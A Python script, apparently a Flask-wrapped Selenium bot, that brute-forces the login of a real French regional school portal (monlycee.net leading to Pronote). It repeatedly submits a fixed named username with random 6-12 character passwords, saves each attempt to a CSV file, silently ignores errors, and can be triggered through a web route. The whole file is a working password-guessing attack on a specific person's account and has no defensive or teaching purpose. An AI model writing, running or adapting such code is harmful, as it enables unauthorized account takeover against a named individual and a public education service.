from flask import Flask
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from numpy import random
import time
import pandas as pd

app = Flask(__name__)

class Instagram:
    url = "https://auth.monlycee.net/realms/IDF/protocol/openid-connect/auth?approval_prompt=force&client_id=psn-web-een&code_challenge=Hk6i76lttokfn5D6I_1bfHD7X0WOAa0op7k3kzQkhNk&code_challenge_method=S256&redirect_uri=https%3A%2F%2Fpsn.monlycee.net%2Foauth2%2Fcallback&response_type=code&scope=openid&state=MhLnsGzR-JFI7cQgDfRT_6zu19AzYLNGfqNmQYfeWXg%3Ahttps%3A%2F%2Fpsn.monlycee.net%2F%3FcallBack%3Dhttps%253A%252F%252Fent.iledefrance.fr%252Fadapter#/https://0950649p.index-education.net/pronote/"
    
    def __init__(self):
        self.driver = webdriver.Edge() 
        time.sleep(1)
        self.go()
        
    def go(self):
        try:
            while True:
                characters = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
                            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '@', '#', '$', '%', '^', '&', '(', ')','*', '+', '-', '=', '_', '!', '?', '~', '`']
                size = random.randint(6,12)
                password = random.choice(characters , size=size)
                password = ''.join(password)
                self.driver.get(self.url)
                time.sleep(0.1)
                username_input = self.driver.find_element(By.XPATH, '//*[@id="username"]').send_keys("francois.herve") 
                time.sleep(0.1)
                self.driver.find_element(By.XPATH, '//*[@id="password"]').send_keys(password)
                time.sleep(0.1)
                self.driver.find_element(By.XPATH , '//*[@id="kc-login"]').click()
                time.sleep(0.1)
                # self.driver.find_element(By.XPATH , '//[@id="mount_0_0_nS"]/div/div/div[2]/div/div/div[1]/section/div/div/div[3]/form/div[2]/div').click()
                # time.sleep(5)
                df = pd.DataFrame({"username" : ["francois.herve"] , "password" : [password]})
                df.to_csv("pass.csv")
        except:
            pass
I = Instagram()

@app.route("/")
def home():
    return "Hello from Flask!"

@app.route("/run-instagram")
def run_instagram():
    I = Instagram()
    return "Selenium task started"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)